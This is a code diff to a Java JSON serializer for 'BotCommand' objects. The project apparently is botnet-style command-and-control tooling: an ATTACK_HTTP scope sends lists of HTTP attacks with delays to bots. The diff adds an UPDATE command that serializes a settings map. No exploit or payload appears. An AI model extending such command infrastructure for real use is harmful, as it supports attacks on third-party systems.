@@ -36,6 +36,7 @@ import com.fasterxml.jackson.databind.ser.std.StdSerializer;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
 
 /**
  * This class realizes the JSON serializer for {@link BotCommand}.
@@ -76,7 +77,7 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
     if (value.getScope().isWithParams()) {
       switch (value.getScope()) {
         case ATTACK_HTTP:
-          final List<HttpAttack> httpAttacks = (List<HttpAttack>) value.getParams().get("attacks");
+          @SuppressWarnings("unchecked") final List<HttpAttack> httpAttacks = (List<HttpAttack>) value.getParams().get("attacks");
           final Interval httpDelay = (Interval) value.getParams().get("delay");
 
           serializeHttpAttacks("attacks", gen, httpAttacks);
@@ -151,6 +152,24 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
 
           if (sleepDelay != null) {
             gen.writeStringField("delay", sleepDelay.toString());
+          }
+
+          break;
+
+        case UPDATE:
+          final Interval updateDelay = (Interval) value.getParams().get("delay");
+          @SuppressWarnings("unchecked") final Map<String,String> settings = (Map<String,String>) value.getParams().get("settings");
+
+          if (settings != null) {
+            gen.writeObjectFieldStart("settings");
+            for (Map.Entry<String,String> entry : settings.entrySet()) {
+              gen.writeStringField(entry.getKey(), entry.getValue());
+            }
+            gen.writeEndObject();
+          }
+
+          if (updateDelay != null) {
+            gen.writeStringField("delay", updateDelay.toString());
           }
 
           break;
